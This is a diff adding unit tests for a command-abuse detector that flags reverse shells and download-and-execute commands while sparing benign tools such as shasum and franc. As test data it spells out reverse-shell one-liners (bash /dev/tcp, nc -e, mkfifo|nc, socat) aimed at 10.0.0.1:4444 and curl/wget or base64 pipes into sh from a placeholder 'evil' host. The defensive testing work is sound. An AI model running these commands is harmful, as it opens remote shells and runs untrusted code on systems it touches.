@@ -71,4 +71,48 @@ describe('detectCommandAbuse — unambiguous patterns still flagged', () => {
   it('flags a reverse shell', () => {
     expect(detectCommandAbuse('bash', ['-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'])?.type).toBe('reverse_shell');
   });
+
+  it('still flags the real nc -e and mkfifo|nc reverse-shell shapes', () => {
+    expect(detectCommandAbuse('nc', ['-e', '/bin/sh', '10.0.0.1', '4444'])?.type).toBe('reverse_shell');
+    expect(detectCommandAbuse('sh', ['-c', 'mkfifo /tmp/f; cat /tmp/f | nc 10.0.0.1 4444 > /tmp/f'])?.type).toBe(
+      'reverse_shell',
+    );
+    expect(detectCommandAbuse('socat', ['exec:/bin/sh', 'tcp:10.0.0.1:4444'])?.type).toBe('reverse_shell');
+  });
+});
+
+describe('detectCommandAbuse — reverse_shell false positives (mkfifo / nc word boundaries)', () => {
+  it('does NOT flag mkfifo on a pipe path that merely contains the letters "nc"', () => {
+    // Previously `mkfifo\s+.*nc` matched the 'nc' inside 'sync' / 'syncthing'.
+    expect(detectCommandAbuse('mkfifo', ['/tmp/sync_pipe'])).toBeUndefined();
+    expect(detectCommandAbuse('mkfifo', ['/var/run/syncthing'])).toBeUndefined();
+    expect(detectCommandAbuse('mkfifo', ['/tmp/concurrency.fifo'])).toBeUndefined();
+    expect(detectCommandAbuse('mkfifo', ['/tmp/cache-nc'])).toBeUndefined();
+  });
+
+  it('does NOT flag a real mkfifo→nc chain when nc only appears as a substring', () => {
+    // A pipe feeding a path-named binary (not the nc executable) is benign.
+    expect(detectCommandAbuse('sh', ['-c', 'mkfifo /tmp/p && cat /tmp/p | encode'])).toBeUndefined();
+  });
+
+  it('does NOT flag the franc CLI invoked with -e (was matched by bare `nc -e`)', () => {
+    expect(detectCommandAbuse('franc', ['-e', 'en', 'file.txt'])).toBeUndefined();
+  });
+});
+
+describe('detectCommandAbuse — malware_download false positives (sh-prefixed words)', () => {
+  it('does NOT flag pipes ending in sh-prefixed binaries', () => {
+    // Previously `\|\s*sh` matched `| shasum`, `| share`, `| shellcheck`.
+    expect(detectCommandAbuse('sh', ['-c', 'curl https://x | wc -l && echo done | shasum'])).toBeUndefined();
+    expect(detectCommandAbuse('sh', ['-c', 'curl https://x | shasum -a 256'])).toBeUndefined();
+    expect(detectCommandAbuse('sh', ['-c', 'wget -qO- https://x | shellcheck -'])).toBeUndefined();
+    expect(detectCommandAbuse('sh', ['-c', 'curl https://x | share'])).toBeUndefined();
+  });
+
+  it('still flags genuine curl|sh and base64 -d|sh download-and-execute', () => {
+    expect(detectCommandAbuse('sh', ['-c', 'curl http://evil/x | sh'])?.type).toBe('malware_download');
+    expect(detectCommandAbuse('sh', ['-c', 'curl http://evil/x | sh; echo ok'])?.type).toBe('malware_download');
+    expect(detectCommandAbuse('sh', ['-c', 'wget -qO- http://evil/x | bash'])?.type).toBe('malware_download');
+    expect(detectCommandAbuse('sh', ['-c', 'echo Zm9v | base64 -d | sh'])?.type).toBe('malware_download');
+  });
 });
